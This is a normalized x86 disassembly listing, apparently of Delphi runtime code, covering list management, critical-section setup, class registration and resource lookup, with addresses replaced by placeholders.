mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
sub_412894
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_404e6c
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4128b4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4138b8
mov edx edi
call sub_412894
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4138b8
mov edx edi
call sub_412894
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4137a8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_412894
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4137a8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_412958
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4138b8
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_412790
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_4129a4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_412674
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41375c
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_412a18
push ebx
push esi
push edi
push ebp
call sub_4034b4
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
mov eax [ esi + 0x4 ]
mov edx edi
call sub_4138b8
call sub_403128
inc edi
dec ebp
jne r-xdata
sub_412a74
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4138b8
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_412604
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_412ab8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_412730
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4138b8
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_412afc
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_412b7f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403078
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b86
lea eax [ ebp - 0x10c ]
call sub_403e78
retn
sub_412b8c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_412a74
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_412598
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_412afc
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4138b8
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4138b8
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403354
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_412a74
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4137a8
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_41375c
sub_412c78
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4138b8
mov edx ebp
call sub_41287c
test al al
jne r-xdata
sub_412cbc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_412674
mov edx eax
mov eax [ edi + 0x4 ]
call sub_41375c
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4138b8
mov eax [ eax + 0xc ]
mov edx ebp
call sub_413914
test eax eax
jge r-xdata
sub_412d18
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4138b8
mov esi eax
mov edx ebp
mov eax esi
call sub_4128b4
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403128
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4137a8
sub_412d68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_412c54
xor eax eax
push ebp
push sub_412e67
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412e6e
mov eax [ rw-data ]
call sub_412d0c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41375c
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4138b8
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_412790
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41375c
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4138b8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_412e6e
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_412e94
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_412ec4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_412c54
xor edx edx
push ebp
push sub_412f3b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_412d0c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403960
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4138b8
mov edx [ ebp - 0x4 ]
call sub_412730
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_412f58
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_412fb8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412fbf
lea eax [ ebp - 0xc ]
call sub_403e78
retn
sub_412fc4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412c54
xor eax eax
push ebp
push sub_41300a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412ab8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413011
mov eax [ rw-data ]
call sub_412d0c
retn
sub_413018
push ebx
push esi
mov esi eax
mov eax esi
call sub_412fc4
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_412f58
sub_413038
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412c54
xor eax eax
push ebp
push sub_41309d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412c78
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_412c60
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130a4
mov eax [ rw-data ]
call sub_412d0c
retn
mov eax ebx
call sub_4030b4
mov ebx eax
sub_4130a8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412c54
xor eax eax
push ebp
push sub_4130ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412d18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4130f1
mov eax [ rw-data ]
call sub_412d0c
retn
sub_4130f4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412c54
xor eax eax
push ebp
push sub_413136
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_412cbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41313d
mov eax [ rw-data ]
call sub_412d0c
retn
sub_413140
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_412c54
xor eax eax
push ebp
push sub_413187
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_412b8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41318e
mov eax [ rw-data ]
call sub_412d0c
retn
sub_413194
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_412c54
xor eax eax
push ebp
push sub_4131e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_412958
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4131e9
mov eax [ rw-data ]
call sub_412d0c
retn
sub_413248
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40344c
pop ebp
retn 0x8
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_413280
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_413248
mov edx eax
mov eax [ rw-data ]
call sub_413b9c
pop edi
pop esi
pop ebx
retn
sub_4132ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413c24
mov esi eax
xor edx edx
push ebp
push sub_413316
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
mov edx ebx
mov eax esi
call sub_4138b8
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403960
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413328
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407b58
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_413368
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403ecc
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4133ac
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_413914
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_41375c
sub_413404
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4138b8
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_413444
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_413404
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_413468
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404338
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_415da0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4134dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4158a0
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_4134ec
push ebx
call sub_405be4
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405be4
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_41375c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov ebx eax
call sub_405be4
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov ebx eax
call sub_405be4
mov [ eax + 0xc ] ebx
sub_413544
push ebx
push esi
push edi
call sub_405be4
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4138b8
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_413574
push ebx
push esi
call sub_405be4
mov eax [ eax + 0x8 ]
call sub_403128
call sub_405be4
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_4139a0
mov esi eax
call sub_405be4
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_4137a8
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405be4
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403128
sub_4135d0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_413666
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41366d
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4030b4
call sub_4135d0
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403078
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4040dc
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_404e94
call sub_404ee4
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_413468
or bl al
sub_413678
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_413726
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_413707
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_403070
call sub_4135d0
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4134ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41370e
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413544
retn
call sub_413574
sub_41373a
add [ eax ] al
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_41375c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4137a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413844
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028b8
mov edx esi
mov eax ebx
call sub_4138b8
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41380c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_413808
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
jmp sub_4038b4
sub_413844
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_41388c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405978
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41380c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413893
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_4138b8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413844
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4138e0
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_413a1c
retn
sub_413914
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_413934
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413844
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028b8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4139ac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413844
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4139fc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_413914
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4137a8
sub_413a1c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413844
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4026fc
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_413a58
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
